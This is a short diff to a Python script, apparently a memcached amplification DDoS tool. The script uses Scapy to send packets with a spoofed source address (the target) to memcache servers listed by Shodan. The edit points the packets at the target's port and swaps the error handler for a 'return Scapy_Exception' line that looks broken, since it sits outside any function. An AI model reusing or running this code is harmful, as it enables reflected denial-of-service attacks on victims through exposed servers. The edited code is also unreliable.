@@ -63,14 +63,10 @@ while True:
             counter=counter+1
             print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
             with suppress_stdout():
-               send(IP(src=target, dst='%s' % i) / TCP(sport=int(str(targetport)),dport=80)/Raw(load=setdata))
-               send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=17091)/Raw(load=getdata))
+               send(IP(src=target, dst='%s' % i) / TCP(sport=int(str(targetport)),dport=targetport)/Raw(load=setdata))
+               send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=targetport)/Raw(load=getdata))
         print('')
         print('[•] Task complete! Exiting Platform. Have a wonderful day.')
         break
-    except:
-        print('')
-        print('[✘] Error: No bots stored locally or remotely on Shodan!')
-        print('[~] Restarting Platform! Please wait.')
-        print('')
-        pass
+    except Scapy_Exception:
+        return Scapy_Exception
